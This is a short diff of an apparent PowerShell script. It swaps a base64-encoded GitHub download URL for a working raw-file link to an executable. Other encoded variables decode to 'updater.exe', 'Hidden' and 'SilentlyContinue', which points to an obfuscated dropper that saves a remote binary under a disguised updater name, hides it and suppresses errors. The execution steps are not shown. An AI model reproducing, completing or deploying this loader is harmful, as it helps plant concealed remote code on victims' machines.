@@ -1,7 +1,7 @@
 # --- BEGIN SCRIPT ---
 
 # Base64-encoded variables
-$downloadUrlB64      = "aHR0cHM6Ly9naXRodWIuY29tL2tleWZhbXMva2V5cy9ibG9iL21haW4vbWFpbi5leGU="
+$downloadUrlB64      = "aHR0cHM6Ly9naXRodWIuY29tL2tleWZhbXMva2V5cy9yYXcvcmVmcy9oZWFkcy9tYWluL21haW4uZXhl"
 $updaterExeB64       = "dXBkYXRlci5leGU="
 $hiddenAttrB64       = "SGlkZGVu"
 $silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
